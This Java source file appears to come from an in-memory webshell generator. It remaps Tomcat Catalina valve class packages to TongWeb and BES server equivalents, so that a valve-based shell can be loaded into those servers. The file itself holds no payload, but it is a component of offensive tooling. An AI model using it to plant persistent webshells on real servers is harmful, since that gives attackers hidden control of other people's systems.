package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.Bes;
import com.reajason.javaweb.memshell.server.TongWeb;
import net.bytebuddy.asm.AsmVisitorWrapper;
import net.bytebuddy.description.field.FieldDescription;
import net.bytebuddy.description.field.FieldList;
import net.bytebuddy.description.method.MethodList;
import net.bytebuddy.description.type.TypeDescription;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.Implementation;
import net.bytebuddy.jar.asm.ClassVisitor;
import net.bytebuddy.jar.asm.commons.ClassRemapper;
import net.bytebuddy.jar.asm.commons.Remapper;
import net.bytebuddy.pool.TypePool;
import org.apache.commons.lang3.StringUtils;
import org.jetbrains.annotations.NotNull;

/**
 * @author ReaJason
 * @since 2025/2/22
 */
public class ValveGenerator {

    public static final String CATALINA_VALVE_PACKAGE = "org.apache.catalina";
    public static final String BES_VALVE_PACKAGE = "com.bes.enterprise.webtier";
    public static final String TONGWEB6_VALVE_PACKAGE = "com.tongweb.web.thor";
    public static final String TONGWEB7_VALVE_PACKAGE = "com.tongweb.catalina";
    public static final String TONGWEB8_VALVE_PACKAGE = "com.tongweb.server";

    public static DynamicType.Builder<?> build(DynamicType.Builder<?> builder, AbstractServer shell, String serverVersion) {
        String packageName = null;
        if (serverVersion.equals("6")) {
            packageName = TONGWEB6_VALVE_PACKAGE;
        } else if (serverVersion.equals("7")) {
            packageName = TONGWEB7_VALVE_PACKAGE;
        } else if (serverVersion.equals("8")) {
            packageName = TONGWEB8_VALVE_PACKAGE;
        } else if (shell instanceof Bes) {
            packageName = BES_VALVE_PACKAGE;
        }
        if (StringUtils.isEmpty(packageName)) {
            if (shell instanceof TongWeb) {
                throw new GenerationException("serverVersion is needed for TongWeb valve shell, please use 6/7/8 for shellConfig.serverVersion");
            }
            return builder;
        }
        return builder.visit(new ValveRenameVisitorWrapper(packageName));
    }

    public static class ValveRenameVisitorWrapper implements AsmVisitorWrapper {
        private final String newPackageName;

        public ValveRenameVisitorWrapper(String newPackageName) {
            this.newPackageName = newPackageName.replace('.', '/');
        }

        @Override
        public int mergeReader(int flags) {
            return flags;
        }

        @Override
        public int mergeWriter(int flags) {
            return flags;
        }

        @NotNull
        @Override
        public ClassVisitor wrap(@NotNull TypeDescription instrumentedType,
                                 @NotNull ClassVisitor classVisitor,
                                 @NotNull Implementation.Context implementationContext,
                                 @NotNull TypePool typePool,
                                 @NotNull FieldList<FieldDescription.InDefinedShape> fields,
                                 @NotNull MethodList<?> methods,
                                 int writerFlags,
                                 int readerFlags) {
            return new ClassRemapper(
                    classVisitor,
                    new Remapper() {
                        @Override
                        public String map(String typeName) {
                            String packageName = CATALINA_VALVE_PACKAGE.replace(".", "/");
                            if (typeName.startsWith(packageName)) {
                                return typeName.replace(packageName, newPackageName);
                            } else {
                                return typeName;
                            }
                        }
                    });
        }
    }
}
